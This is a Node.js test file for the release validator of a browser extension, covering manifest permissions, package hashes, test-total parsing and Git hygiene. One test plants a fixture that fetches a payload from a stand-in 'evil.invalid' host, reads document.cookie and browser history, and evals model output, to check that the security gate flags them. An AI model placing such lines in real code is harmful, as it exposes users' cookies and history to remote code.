const test = require('node:test');
const assert = require('node:assert/strict');
const childProcess = require('node:child_process');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const Validator = require('../scripts/validate-v0.4.0');

function temporaryRoot(t, prefix = 'halo-v040-validator-') {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), prefix));
  t.after(() => fs.rmSync(root, { recursive: true, force: true }));
  return root;
}

function writeJson(filePath, value) {
  fs.mkdirSync(path.dirname(filePath), { recursive: true });
  fs.writeFileSync(filePath, `${JSON.stringify(value, null, 2)}\n`);
}

function write(filePath, value) {
  fs.mkdirSync(path.dirname(filePath), { recursive: true });
  fs.writeFileSync(filePath, value);
}

test('v0.4 validator requires exactly one explicit mode and supports --root', () => {
  assert.equal(Validator.parseCli(['--development']).mode, 'development');
  assert.equal(Validator.parseCli(['--standalone']).mode, 'standalone');
  assert.equal(Validator.parseCli(['--root', '/tmp/example', '--standalone']).root, path.resolve('/tmp/example'));
  assert.throws(() => Validator.parseCli([]), /development.*standalone/i);
  assert.throws(() => Validator.parseCli(['--development', '--standalone']), /exactly one/i);
});

test('machine-readable node test totals never silently become null', () => {
  const parsed = Validator.parseNodeTestSummary('TAP version 13\n# tests 5\n# pass 5\n# fail 0\n# skipped 0\n# todo 0\n');
  assert.deepEqual(parsed, {
    status: 'known',
    tests: 5,
    pass: 5,
    fail: 0,
    skipped: 0,
    todo: 0
  });

  const unknown = Validator.parseNodeTestSummary('TAP version 13\n# no summary here\n');
  assert.equal(unknown.status, 'unknown');
  for (const key of ['tests', 'pass', 'fail', 'skipped', 'todo']) {
    assert.notEqual(unknown[key], null);
  }
  assert.equal(unknown.tests, 'unknown');
  assert.match(unknown.reason, /missing/i);

  const infoReporter = Validator.parseNodeTestSummary('ℹ tests 5\nℹ pass 5\nℹ fail 0\nℹ skipped 0\nℹ todo 0\n');
  assert.equal(infoReporter.status, 'known');
  assert.equal(infoReporter.tests, 5);
  assert.equal(infoReporter.fail, 0);
});

test('standalone hygiene performs no Git subprocess even when git is unavailable', (t) => {
  const root = temporaryRoot(t);
  write(path.join(root, 'README.md'), '# Standalone\n');
  const originalPath = process.env.PATH;
  process.env.PATH = '/definitely/no-tools-here';
  t.after(() => { process.env.PATH = originalPath; });

  const report = Validator.validateHygiene(root, 'standalone');
  assert.equal(report.mode, 'standalone-source-audit');
  assert.equal(report.gitInvoked, false);
  assert.equal(report.gitMetadataPresent, false);
});

test('standalone hygiene rejects packaged Git metadata without invoking Git', (t) => {
  const root = temporaryRoot(t);
  fs.mkdirSync(path.join(root, '.git'));
  assert.throws(() => Validator.validateHygiene(root, 'standalone'), /Git metadata/i);
});

test('progress stages emit START and terminal status', () => {
  const events = [];
  const value = Validator.runStage('example', () => 7, { emit: (line) => events.push(line) });
  assert.equal(value, 7);
  assert.deepEqual(events, ['[v0.4] START example', '[v0.4] PASS example']);

  const failed = [];
  assert.throws(() => Validator.runStage('broken', () => { throw new Error('boom'); }, { emit: (line) => failed.push(line) }), /boom/);
  assert.deepEqual(failed, ['[v0.4] START broken', '[v0.4] FAIL broken: boom']);
});

test('extension manifest gate enforces local-only v0.4 MV3 permission boundary', (t) => {
  const root = temporaryRoot(t);
  const manifestPath = path.join(root, 'apps', 'extension', 'manifest.json');
  writeJson(manifestPath, {
    manifest_version: 3,
    version: '0.4.0',
    permissions: ['activeTab', 'contextMenus', 'scripting', 'storage'],
    background: { service_worker: 'src/service-worker.js' }
  });
  assert.equal(Validator.validateExtensionManifest(root).version, '0.4.0');

  const missingContextMenu = JSON.parse(fs.readFileSync(manifestPath, 'utf8'));
  missingContextMenu.permissions = missingContextMenu.permissions.filter((permission) => permission !== 'contextMenus');
  writeJson(manifestPath, missingContextMenu);
  assert.throws(() => Validator.validateExtensionManifest(root), /permission scope/i);

  const manifest = { ...missingContextMenu, permissions: ['activeTab', 'contextMenus', 'scripting', 'storage'] };
  manifest.host_permissions = ['https://example.invalid/*'];
  writeJson(manifestPath, manifest);
  assert.throws(() => Validator.validateExtensionManifest(root), /host permissions/i);
});

test('acceptance map covers every frozen Worker C release category', () => {
  const required = [
    'dynamic-dom',
    'reversible-idempotent-rendering',
    'triggers',
    'sensitive-site-fail-closed',
    'accessibility',
    'browser-fixture-matrix-20',
    'browser-performance',
    'mv3-lifecycle',
    'standalone-release-validation',
    'package-integrity'
  ];
  assert.deepEqual(Validator.ACCEPTANCE_MAP.map((item) => item.id), required);
  for (const item of Validator.ACCEPTANCE_MAP) {
    assert.ok(Array.isArray(item.evidenceAny) && item.evidenceAny.length > 0);
  }
});

test('acceptance map validator reports missing evidence explicitly', (t) => {
  const root = temporaryRoot(t);
  const report = Validator.validateAcceptanceMap(root);
  assert.equal(report.ok, false);
  assert.ok(report.missing.length >= 1);
  assert.ok(report.missing.every((entry) => typeof entry.id === 'string'));
});

test('privacy/security gate rejects remote code and dangerous data/runtime access patterns', (t) => {
  const root = temporaryRoot(t);
  write(path.join(root, 'apps', 'extension', 'src', 'shared', 'safe.js'), "'use strict';\nconst local = chrome.runtime.getURL('data/index.json');\n");
  assert.equal(Validator.validatePrivacySecurity(root).ok, true);

  write(path.join(root, 'apps', 'extension', 'src', 'shared', 'bad.js'), [
    "fetch('https://evil.invalid/payload.js');",
    'document.cookie;',
    'chrome.history.search({text: ""});',
    'eval(modelOutput);'
  ].join('\n'));
  const report = Validator.validatePrivacySecurity(root);
  assert.equal(report.ok, false);
  const codes = new Set(report.issues.map((item) => item.code));
  assert.ok(codes.has('REMOTE_NETWORK_LITERAL'));
  assert.ok(codes.has('COOKIE_ACCESS'));
  assert.ok(codes.has('HISTORY_ACCESS'));
  assert.ok(codes.has('DYNAMIC_CODE_EXECUTION'));
});

test('test runner treats unparseable totals as a clear failure state', (t) => {
  const root = temporaryRoot(t);
  write(path.join(root, 'fake-test.js'), "process.stdout.write('TAP version 13\\n# not-a-summary\\n');\n");
  assert.throws(
    () => Validator.runNodeTestCommand(root, process.execPath, ['fake-test.js'], 'fake tests'),
    /unable to parse.*test totals/i
  );
});

test('package metadata gate exposes the v0.4 release commands without silently accepting v0.3', (t) => {
  const root = temporaryRoot(t);
  writeJson(path.join(root, 'package.json'), {
    name: 'halo-learning',
    version: '0.4.0',
    scripts: {
      validate: 'node scripts/validate-v0.4.0.js --development',
      'validate:standalone': 'node scripts/validate-v0.4.0.js --standalone',
      'package:release': 'node scripts/package-v0.4.0.js'
    }
  });
  assert.equal(Validator.validatePackageMetadata(root).version, '0.4.0');

  const metadata = JSON.parse(fs.readFileSync(path.join(root, 'package.json'), 'utf8'));
  metadata.version = '0.3.0';
  writeJson(path.join(root, 'package.json'), metadata);
  assert.throws(() => Validator.validatePackageMetadata(root), /v0\.4\.0 release metadata/i);
});

test('extension ZIP validation compares exact inventory and source bytes', (t) => {
  const root = temporaryRoot(t);
  write(path.join(root, 'apps/extension/manifest.json'), '{"manifest_version":3,"version":"0.4.0"}\n');
  write(path.join(root, 'apps/extension/README.md'), '# Extension\n');
  write(path.join(root, 'apps/extension/src/service-worker.js'), "'use strict';\n");
  write(path.join(root, 'apps/extension/src/content.js'), "'use strict';\n");
  write(path.join(root, 'apps/extension/data/runtime.json'), '{}\n');
  write(path.join(root, 'THIRD_PARTY_NOTICES.md'), '# Notices\n');
  write(path.join(root, 'data/corpora/princeton-wordnet-3.0/LICENSE'), 'WordNet license\n');
  const Packaging = require('../scripts/package-v0.4.0');
  Packaging.packageExtension(root);

  assert.equal(Validator.validateExtensionZip(root).version, '0.4.0');
  write(path.join(root, 'apps/extension/src/content.js'), "'use strict';\n// changed after package\n");
  assert.throws(() => Validator.validateExtensionZip(root), /differs from.*source|byte/i);
});

test('package manifest gate verifies SHA-256 for both release bundles', (t) => {
  const root = temporaryRoot(t);
  write(path.join(root, 'dist/halo-learning-magic-hand-v0.4.0.zip'), 'extension bytes');
  write(path.join(root, 'releases/Halo_Learning_v0.4.0_Browser_Runtime_UX_Release.zip'), 'source bytes');
  const crypto = require('node:crypto');
  const sha = (filePath) => crypto.createHash('sha256').update(fs.readFileSync(filePath)).digest('hex');
  const extensionPath = path.join(root, 'dist/halo-learning-magic-hand-v0.4.0.zip');
  const sourcePath = path.join(root, 'releases/Halo_Learning_v0.4.0_Browser_Runtime_UX_Release.zip');
  writeJson(path.join(root, 'dist/halo-learning-v0.4.0-package-manifest.json'), {
    schemaVersion: 1,
    release: 'v0.4.0',
    hashAlgorithm: 'sha256',
    extension: { path: 'dist/halo-learning-magic-hand-v0.4.0.zip', sha256: sha(extensionPath) },
    source: { path: 'releases/Halo_Learning_v0.4.0_Browser_Runtime_UX_Release.zip', sha256: sha(sourcePath), gitMetadataPresent: false }
  });
  assert.equal(Validator.validatePackageManifest(root).release, 'v0.4.0');

  write(sourcePath, 'tampered source bytes');
  assert.throws(() => Validator.validatePackageManifest(root), /hash mismatch/i);
});

test('source package validation is byte-auditable in development and standalone mode never requires its outer ZIP', (t) => {
  const root = temporaryRoot(t);
  const Packaging = require('../scripts/package-v0.4.0');
  const requiredFiles = {
    '.gitattributes': '* text=auto\n',
    '.gitignore': 'node_modules/\n',
    'README.md': '# Halo\n',
    'THIRD_PARTY_NOTICES.md': '# Notices\n',
    'package.json': '{"name":"halo-learning","version":"0.4.0"}\n',
    'package-lock.json': '{"lockfileVersion":3}\n',
    'apps/extension/manifest.json': '{"manifest_version":3,"version":"0.4.0"}\n',
    'apps/extension/README.md': '# Extension\n',
    'apps/extension/src/service-worker.js': "'use strict';\n",
    'apps/extension/data/runtime.json': '{}\n',
    'packages/contracts/example.js': "'use strict';\n",
    'scripts/example.js': "'use strict';\n",
    'tests/example.test.js': "'use strict';\n",
    'fixtures/example.txt': 'fixture\n',
    'data/corpora/princeton-wordnet-3.0/LICENSE': 'WordNet license\n',
    'docs/validation/example.md': '# evidence\n',
    'dist/runtime.json': '{}\n'
  };
  for (const [relative, content] of Object.entries(requiredFiles)) write(path.join(root, relative), content);
  Packaging.packageSourceRelease(root);

  assert.equal(Validator.validateSourcePackage(root, 'development').gitMetadataPresent, false);
  fs.rmSync(path.join(root, Packaging.SOURCE_OUTPUT));
  assert.deepEqual(Validator.validateSourcePackage(root, 'standalone'), {
    validatedBy: 'extracted-standalone-root',
    gitRequired: false
  });
});

test('browser performance gate requires both real-browser evidence files and verifies them through the profiler', (t) => {
  const root = temporaryRoot(t);
  write(path.join(root, 'scripts/profile-browser-runtime.js'), [
    "'use strict';",
    "const fs = require('node:fs');",
    "const args = process.argv.slice(2);",
    "const outputIndex = args.indexOf('--output');",
    "if (!args.includes('--verify') || outputIndex < 0 || !fs.existsSync(args[outputIndex + 1])) process.exit(2);",
    "if (args.includes('--compare-buckets') && args[args.indexOf('--compare-buckets') + 1] !== '64,128') process.exit(3);"
  ].join('\n') + '\n');
  writeJson(path.join(root, 'docs/validation/v0.4.0-browser-baseline.json'), { schemaVersion: 1 });
  writeJson(path.join(root, 'docs/validation/v0.4.0-browser-shard-comparison.json'), { schemaVersion: 1 });

  const report = Validator.validateBrowserPerformanceEvidence(root);
  assert.equal(report.baseline, 'docs/validation/v0.4.0-browser-baseline.json');
  assert.equal(report.shardComparison, 'docs/validation/v0.4.0-browser-shard-comparison.json');

  fs.rmSync(path.join(root, 'docs/validation/v0.4.0-browser-baseline.json'));
  assert.throws(() => Validator.validateBrowserPerformanceEvidence(root), /browser performance evidence.*missing/i);
});

test('release test discovery separates Node regression from real Chromium E2E', (t) => {
  const root = temporaryRoot(t);
  write(path.join(root, 'tests/unit-a.test.js'), "'use strict';\n");
  write(path.join(root, 'tests/unit-b.test.js'), "'use strict';\n");
  write(path.join(root, 'tests/browser/a.e2e.test.js'), "'use strict';\n");
  write(path.join(root, 'tests/browser/helper.js'), "'use strict';\n");
  assert.deepEqual(Validator.listNodeRegressionTests(root), ['tests/unit-a.test.js', 'tests/unit-b.test.js']);
  assert.deepEqual(Validator.listBrowserE2ETests(root), ['tests/browser/a.e2e.test.js']);
});

test('shipped JavaScript syntax gate checks extension, packages, and release scripts', (t) => {
  const root = temporaryRoot(t);
  write(path.join(root, 'apps/extension/src/content.js'), "'use strict';\n");
  write(path.join(root, 'packages/contracts/example.js'), "'use strict';\n");
  write(path.join(root, 'scripts/example.js'), "'use strict';\n");
  assert.equal(Validator.validateJavaScriptSyntax(root).filesChecked, 3);
  write(path.join(root, 'scripts/bad.js'), 'function {\n');
  assert.throws(() => Validator.validateJavaScriptSyntax(root), /syntax check.*bad\.js/i);
});

test('standalone release orchestration runs every non-Git v0.4 gate with explicit test totals', (t) => {
  const root = temporaryRoot(t);
  const Packaging = require('../scripts/package-v0.4.0');
  const passTest = (name) => [
    "const test = require('node:test');",
    "const assert = require('node:assert/strict');",
    `test(${JSON.stringify(name)}, () => assert.equal(1, 1));`
  ].join('\n') + '\n';
  const files = {
    '.gitattributes': '* text=auto\n',
    '.gitignore': 'node_modules/\n',
    'README.md': '# Halo\n',
    'THIRD_PARTY_NOTICES.md': '# Notices\n',
    'package.json': JSON.stringify({
      name: 'halo-learning',
      version: '0.4.0',
      scripts: {
        validate: 'node scripts/validate-v0.4.0.js --development',
        'validate:standalone': 'node scripts/validate-v0.4.0.js --standalone',
        'package:release': 'node scripts/package-v0.4.0.js'
      }
    }) + '\n',
    'package-lock.json': '{"lockfileVersion":3}\n',
    'apps/extension/manifest.json': JSON.stringify({
      manifest_version: 3,
      version: '0.4.0',
      permissions: ['activeTab', 'contextMenus', 'scripting', 'storage'],
      background: { service_worker: 'src/service-worker.js' }
    }) + '\n',
    'apps/extension/README.md': '# Extension\n',
    'apps/extension/src/service-worker.js': "'use strict';\n",
    'apps/extension/src/content.js': "'use strict';\n",
    'apps/extension/data/runtime.json': '{}\n',
    'packages/contracts/example.js': "'use strict';\n",
    'scripts/profile-browser-runtime.js': [
      "'use strict';",
      "const fs = require('node:fs');",
      "const args = process.argv.slice(2);",
      "const outputIndex = args.indexOf('--output');",
      "if (!args.includes('--verify') || outputIndex < 0 || !fs.existsSync(args[outputIndex + 1])) process.exit(2);"
    ].join('\n') + '\n',
    'scripts/validate-v0.4.0.js': "'use strict';\n",
    'scripts/package-v0.4.0.js': "'use strict';\n",
    'tests/dynamic-dom-controller.test.js': passTest('dynamic'),
    'tests/reversible-renderer.test.js': passTest('renderer'),
    'tests/trigger-controller.test.js': passTest('trigger'),
    'tests/site-policy.test.js': passTest('policy'),
    'tests/accessibility.test.js': passTest('accessibility'),
    'tests/browser-service-worker-cdp.test.js': passTest('mv3 unit'),
    'tests/release-validator-v0.4.0.test.js': passTest('validator'),
    'tests/release-packaging-v0.4.0.test.js': passTest('packaging'),
    'tests/browser/fixture-matrix.e2e.test.js': passTest('browser matrix'),
    'fixtures/browser/article.html': '<!doctype html><p>fixture</p>\n',
    'fixtures/example.txt': 'fixture\n',
    'data/corpora/princeton-wordnet-3.0/LICENSE': 'WordNet license\n',
    'docs/validation/v0.4.0-browser-baseline.json': '{"schemaVersion":1}\n',
    'docs/validation/v0.4.0-browser-shard-comparison.json': '{"schemaVersion":1}\n',
    'dist/runtime.json': '{}\n'
  };
  for (const [relative, content] of Object.entries(files)) write(path.join(root, relative), content);
  Packaging.packageExtension(root);

  const report = Validator.validateRelease(root, 'standalone', { emit: () => {} });
  assert.equal(report.release, 'v0.4.0');
  assert.equal(report.mode, 'standalone');
  assert.equal(report.tests.nodeRegression.status, 'known');
  assert.equal(report.tests.nodeRegression.fail, 0);
  assert.equal(report.tests.browserE2E.status, 'known');
  assert.equal(report.tests.browserE2E.fail, 0);
  assert.equal(report.packageIntegrity.validatedBy, 'extracted-standalone-root');
  assert.equal(report.hygiene.gitInvoked, false);
});
